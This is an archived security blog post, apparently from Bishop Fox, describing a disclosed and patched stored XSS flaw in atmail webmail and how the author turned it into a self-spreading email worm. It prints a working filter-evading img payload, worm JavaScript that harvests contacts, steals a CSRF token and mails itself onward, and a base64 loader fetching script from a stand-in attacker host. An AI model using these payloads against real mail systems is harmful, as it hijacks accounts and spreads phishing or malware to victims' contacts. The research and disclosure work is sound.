---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-06-23_how-i-built-an-xss-worm-on-atmail.md
original_filename: 2017-06-23_how-i-built-an-xss-worm-on-atmail.md
title: How I Built An XSS Worm On Atmail
category: documents
detected_topics:
- xss
- sso
- command-injection
- otp
- automation-abuse
- csrf
tags:
- imported
- documents
- xss
- sso
- command-injection
- otp
- automation-abuse
- csrf
language: en
raw_sha256: 5b55048413cfe728887b3e71743681bcf41d8023db4984bcafa858f5612f9ab4
text_sha256: dcf1b805f351bdc70008bf7b95d024c6169b63397a909e6b5b6b4a0aecf1e70c
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# How I Built An XSS Worm On Atmail

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-06-23_how-i-built-an-xss-worm-on-atmail.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, otp, automation-abuse, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `5b55048413cfe728887b3e71743681bcf41d8023db4984bcafa858f5612f9ab4`
- Text SHA256: `dcf1b805f351bdc70008bf7b95d024c6169b63397a909e6b5b6b4a0aecf1e70c`


## Content

---
title: "How I Built An XSS Worm On Atmail"
page_title: "How I Built An XSS Worm On Atmail | Bishop Fox"
url: "https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/"
final_url: "https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail/"
authors: ["Jake Miller"]
programs: ["Atmail"]
bugs: ["XSS"]
publication_date: "2017-06-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6175
---

Share

[ ](https://www.facebook.com/share.php?u=https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail&amp;utm_medium=social&amp;utm_source=facebook) [ ](https://twitter.com/intent/tweet?url=https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail&utm_medium=social&utm_source=twitter&source=tweetbutton&text=) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://bishopfox.com/blog/how-i-built-an-xss-worm-on-atmail&utm_medium=social&utm_source=linkedin) [ ](/feeds/technology.rss)

Atmail is a popular provider for cloud-based and on-premises email hosting. It is used by companies, hosting providers, and ISPs including DreamHost, [LegalShield](https://www.legalshield.com/) (US), m:tel (Bosnia), iiNet, and Optus (Australia).

Being an atmail user on DreamHost, and having seen several impressive email-based cross-site scripting (XSS) attacks during my work with bug bounty programs, I attempted to find a vulnerability in their webmail front-end. I had a working payload a few hours later, but wanted to take it a step further by building an [old-school XSS worm](https://en.wikipedia.org/wiki/XSS_worm). The most well-known example of an XSS worm [affected MySpace in 2005](https://en.wikipedia.org/wiki/Samy_\(computer_worm\)), with a more recent variation [targeting TweetDeck in 2014](https://nakedsecurity.sophos.com/2014/06/11/twitter-jumps-to-block-xss-worm-in-tweetdeck/).

In this post, I’ll demonstrate building an XSS payload that propagates itself through a victim’s contacts. 

## **The Testing Environment**

Before starting, I prepared a simple testing environment. Emails were sent using a command like the following, piping the XSS test payloads within content into mail:
  
  
  cat content | mail -a "Content-type: text/html" -s "test" [[email protected]](/cdn-cgi/l/email-protection)

I then used the Firefox Developer Tools to view how the XSS payload was rendered in the DOM of the webmail client.

## **Building the XSS Payload**

The first step was to build an XSS payload that would survive atmail’s content filtering intact. I started by sending an email containing every valid HTML tag to see which ones would remain after it was delivered, although I eventually decided to use the <img> tag. While <img> lends itself well to building XSS payloads, its disadvantage is that the victim must decide to “Display Images” within atmail before the XSS will trigger. It is likely a better payload could be developed using a tag which renders without further user interaction.

Next, I began taking notes on how atmail sanitized my payloads. I needed to observe how atmail manipulated the characters and HTML attributes in the <img> tag in order to evade the filter and render a syntactically-correct tag in the victim’s browser. By sending an <img> tag containing every valid attribute(1), I noticed that only the src, alt, longdesc, style, height, and width attributes were permitted. Additionally, I noticed several modifications to my payload, such as converting single quotes to double quotes, removing the onerror event, and removing any <img> tag without a src attribute.

Although the onerror event was removed, I suspected the conversion of single to double quotes might help evade the whitelist if both were used in the <img> tag. In the end, this suspicion proved correct, although I had to use the set of double quotes across two <img> tags. The below is the working XSS payload:
  
  
  <img longdesc="src='x'onerror=alert(document.domain);//><img " src='showme'>

This was rendered as the following in the webmail client:
  
  
  <img longdesc="src=" images="" stop.png"="" onerror="alert(document.domain);//"" src="x" alt="showme">

Without viewing the application source code, it is impossible to know exactly what changes are being made to my payload before it is delivered. However, it appears that atmail interprets the single and double quotes in such a way that the two <img> tags are combined into one. Including the onerror event in the longdesc attribute has allowed it through the content filter and rendered the XSS correctly after processing.

![screenshot of rendered XSS correctly after processing](https://cdn2.hubspot.net/hubfs/5632775/Imported_Blog_Media/DreamHost1.png)

## **Building the Worm**

After finding a working XSS vector, the next step was to create a payload to spread my email worm. I wrote some JavaScript that executes in three steps:

  * Extract a victim’s contacts list
  * Grab a valid CSRF token from atmail
  * Send an email to each of the victim’s contacts

This code resembled the following, with the XSS payload included in the block of URL-encoded text:
  
  
  //HTTP request to grab victim's contacts
  
  xmlHttp=new XMLHttpRequest();
  
  xmlHttp.open('GET','/index.php/mail/contacts/viewcontacts/GroupID/0',false);
  
  xmlHttp.send(null);
  
  response=xmlHttp.responseText;
  
  
  //Extract email addresses and filter duplicates
  var extractedemails = response.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+.[A-Z]{2,4}/igm);
  var uniqueemails = [];
  for(var i = 0; i < extractedemails.length; i++){if (uniqueemails.indexOf(extractedemails[i]) == -1) uniqueemails.push(extractedemails[i]);}
  
  
  //HTTP request to get CSRF token
  xmlHttp.open('GET','/index.php/mail/contacts',false);
  xmlHttp.send(null);
  response2=xmlHttp.responseText;
  var csrftoken = response2.match(/name=\"atmailCSRF" value=\"(.+?)\"/im);
  
  
  //Loop through contacts and send email
  for (var i = 0; i < uniqueemails.length; i++) {
  xmlHttp.open('POST','/index.php/mail/composemessage/send',false);
  var params = 'atmailCSRF=' + csrftoken[1] + '&emailTo=' + unique[i] + '&emailSubject=open%20me&emailBodyHtml=%3c%68%33%3e%61%74%6d%61%69%6c%20%65%6d%61%69%6c%20%58%53%53%20%77%6f%72%6d%3c%2f%68%33%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%3c%69%6d%67%20%6c%6f%6e%67%64%65%73%63%3d%22%73%72%63%3d%27%78%27%6f%6e%65%72%72%6f%72%3d%65%76%61%6c%28%77%69%6e%64%6f%77%2e%61%74%6f%62%28%27%61%57%35%6a%62%48%56%6b%5a%54%31%6b%62%32%4e%31%62%57%56%75%64%43%35%6a%63%6d%56%68%64%47%56%46%62%47%56%74%5a%57%35%30%4b%43%64%7a%59%33%4a%70%63%48%51%6e%4b%54%74%70%62%6d%4e%73%64%57%52%6c%4c%6e%4e%79%59%7a%30%6e%61%48%52%30%63%48%4d%36%4c%79%39%68%64%48%52%68%59%32%74%6c%63%69%35%6a%62%32%30%76%59%58%52%74%59%57%6c%73%4c%6d%70%7a%4a%7a%74%6b%62%32%4e%31%62%57%56%75%64%43%35%6f%5a%57%46%6b%4c%6d%46%77%63%47%56%75%5a%45%4e%6f%61%57%78%6b%4b%47%6c%75%59%32%78%31%5a%47%55%70%4f%77%3d%3d%27%29%29%3b%2f%2f%3e%3c%69%6d%67%20%22%20%73%72%63%3d%27%73%68%6f%77%6d%65%27%3e';
  xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  xmlHttp.send(params);

At first, I attempted to Base64-encode a minified version of this JavaScript and include it within the onerror event of the XSS payload. It would then be decoded and executed using eval(atob()), as shown below:
  
  
  <img longdesc=" xss/ src='x'onerror=eval(window.atob('eGg9bmV3IFhNTEh0dHBS…omitted for brevity…'));//><img " src='showme'>

However, I noticed that atmail limited my Base64 string to 945 characters, which was too short. Instead of including the entire script in the onerror event, I hosted it at an external location, then rewrote my XSS payload like the following:
  
  
  onerror="include=document.createElement('script');include.src='https://attacker.com/atmail.js';document.head.appendChild(include);"

The payload shown above creates a new <script> tag in the <head> element of the page, including my malicious externally-hosted JavaScript. This was also Base64-encoded, making the final payload as follows:
  
  
  <img longdesc="src='x'onerror=eval(window.atob('aW5jbHVkZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtpbmNsdWRlLnNyYz0naHR0cHM6Ly9hdHRhY2tlci5jb20vYXRtYWlsLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGluY2x1ZGUpOw=='));//><img " src='showme'>

With everything in place, the worm was now functional. This video demonstrates it in action:

An XSS worm on atmail would benefit spammers and other malicious actors who would benefit from manipulating victims into sending arbitrary messages to their contacts list. Because of its viral nature and the additional trust associated with email received from a known contact, this attack would be well-suited for spam, malware delivery, or phishing attacks. 

### **Disclosure Timeline:**

After discovering this vulnerability, I began the responsible disclosure process with atmail. As of May 25, 2017, they have remediated the issue, which can be patched by upgrading to [atmail version 7.8.0.2](https://help.atmail.com/hc/en-us/articles/115007169147-Minor-Update-7-8-0-2-ActiveSync-2-3-6).

  * **2017-02-24 – Vulnerability reported**
  * **2017-02-27 – Report acknowledged**
  * **2017-05-25 – Patch released**

**References**

(1)
  
  
  <img src="x" align="left" alt="test" border="1px" crossorigin="anonymous" height="100px" hspace="100px" ismap longdesc="test" sizes="(min-width: 600px) 200px, 50vw" srcset="test.png 2x" usemap="#test" vspace="100px" width="100px">

_Supercomputer image by[Dennis van Zuijlekom](https://www.flickr.com/photos/dvanzuijlekom/ "Go to Dennis van Zuijlekom's photostream")_

* * *

![Zach julian](https://assets.bishopfox.com/prod-1437/Images/headshots/zach-julian.jpg)

By Zach Julian 

Senior Security Consultant

Zachary Julian is a Senior Security Consultant at Bishop Fox. In this role, he specializes in web application penetration testing, source code review, and hybrid application assessments.  
  
Zach discovered [CVE-2017-11617](https://bishopfox.com/blog/atmail-7-stored-xss-advisory), a stored cross-site scripting vulnerability affecting a popular webmail product, and has presented at events such as (ISC)2 Phoenix, CactusCon, and Converge Detroit. He has also been quoted on topical security issues in Forbes, [Vice Motherboard](https://www.vice.com/en/article/bj7m34/a-roundtable-of-hackers-dissects-mr-robot-season-3-episode-3-legacy), [The Intercept](https://theintercept.com/2017/08/27/hit-app-sarahah-quietly-uploads-your-address-book/), and [eSecurityPlanet](https://www.esecurityplanet.com/networks/googles-new-disclosure-policy-helpful-or-who-cares/).  
---  
  
[ More by Zach Julian  ](https://bishopfox.com/authors/zach-julian)

[ ](https://twitter.com/tprime_)

![](/static/assets/images/backgrounds/lander-header-bg-black-lines.svg)

Subscribe to our blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.
